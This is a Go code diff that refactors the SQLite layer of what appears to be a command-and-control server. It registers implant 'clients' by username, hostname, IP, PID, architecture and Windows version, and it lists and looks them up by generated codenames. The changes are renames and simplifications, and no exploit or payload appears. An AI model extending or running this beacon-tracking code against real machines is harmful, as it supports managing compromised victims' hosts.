@@ -2,36 +2,33 @@ package database
 
 import (
 	"bytes"
-	"database/sql"
 	"fmt"
 	"log/slog"
 	"math/rand"
 	"time"
 
-	bytehandler "github.com/execute-assembly/c2-proj/newserver/internal/bytes"
+	bytehandler "github.com/execute-assembly/c2-proj/server/internal/bytes"
 
 	_ "modernc.org/sqlite"
 )
 
-func gen_string() string {
+func genCodename() string {
 	str1 := nouns[rand.Intn(len(nouns))]
 	str2 := verbs[rand.Intn(len(verbs))]
 	return fmt.Sprintf("%s_%s", str1, str2)
 }
 
 func ArchIntToString(arch byte) string {
-	var ArchStr string
 	switch arch {
 	case 0x1:
-		ArchStr = "x86"
+		return "x86"
 	case 0x2:
-		ArchStr = "x64"
+		return "x64"
 	case 0x3:
-		ArchStr = "ARM"
+		return "ARM"
 	default:
-		ArchStr = "UNKNOWN"
+		return "UNKNOWN"
 	}
-	return ArchStr
 }
 
 func RegisterClient(data *bytes.Reader, IpAddress string) (string, string, error) {
@@ -44,33 +41,30 @@ func RegisterClient(data *bytes.Reader, IpAddress string) (string, string, error
 		return "", "", err
 	}
 
-	ArchStr := ArchIntToString(clientData.Arch)
+	codeName := genCodename()
 	query := `INSERT INTO clients(guid, code_name, username, hostname, ip, pid, arch, version, last_checkin) VALUES(?,?,?,?,?,?,?,?,?)`
-	code_name := gen_string()
 
-	_, err = db.Exec(query, clientData.Guid, code_name, clientData.Username, clientData.Hostname, clientData.Ip, clientData.Pid, ArchStr, clientData.WinVersion, time.Now().Unix())
+	_, err = db.Exec(query, clientData.Guid, codeName, clientData.Username, clientData.Hostname, clientData.Ip, clientData.Pid, ArchIntToString(clientData.Arch), clientData.WinVersion, time.Now().Unix())
 	if err != nil {
 		return "", "", err
 	}
-	slog.Info("New User Registered", "username", clientData.Username, "hostname", clientData.Hostname, "code_name", code_name)
+	slog.Info("New User Registered", "username", clientData.Username, "hostname", clientData.Hostname, "code_name", codeName)
 
-	return clientData.Guid, code_name, nil
-
+	return clientData.Guid, codeName, nil
 }
 
-func CheckIfUserExists_db(Guid string) (bool, error) {
+func CheckIfUserExists_db(guid string) (bool, error) {
 	db, err := GetDB()
 	if err != nil {
 		return false, err
 	}
 	query := `SELECT EXISTS(SELECT 1 FROM clients WHERE guid = ?)`
 	var exists bool
-	err = db.QueryRow(query, Guid).Scan(&exists)
+	err = db.QueryRow(query, guid).Scan(&exists)
 	if err != nil {
 		return false, err
 	}
 	return exists, nil
-
 }
 
 func ListClients_db() ([]ClientData, error) {
@@ -84,38 +78,34 @@ func ListClients_db() ([]ClientData, error) {
 		return nil, err
 	}
 
-	var Clients []ClientData
+	var clients []ClientData
 
 	for rows.Next() {
 		var c ClientData
-		err := rows.Scan(&c.Guid, &c.Code_name, &c.Username, &c.Hostname, &c.Ip, &c.Arch, &c.Pid, &c.Version, &c.Last_checkin)
+		err := rows.Scan(&c.Guid, &c.CodeName, &c.Username, &c.Hostname, &c.Ip, &c.Arch, &c.Pid, &c.Version, &c.LastCheckin)
 		if err != nil {
 			return nil, err
 		}
-		Clients = append(Clients, c)
+		clients = append(clients, c)
 	}
 	if err = rows.Err(); err != nil {
 		return nil, err
 	}
-	return Clients, nil
+	return clients, nil
 }
 
-func ConvertCodeName_db(Codename string) (string, error) {
+func ConvertCodeName_db(codename string) (string, error) {
 	db, err := GetDB()
 	if err != nil {
 		return "", err
 	}
 
-	var Guid string
-	err = db.QueryRow("SELECT guid FROM clients WHERE code_name = ?", Codename).Scan(&Guid)
+	var guid string
+	err = db.QueryRow("SELECT guid FROM clients WHERE code_name = ?", codename).Scan(&guid)
 	if err != nil {
-		if err == sql.ErrNoRows {
-			return "", err
-		}
 		return "", err
 	}
-	return Guid, nil
-
+	return guid, nil
 }
 
 func UpdateLastSeen_db(guid string) error {
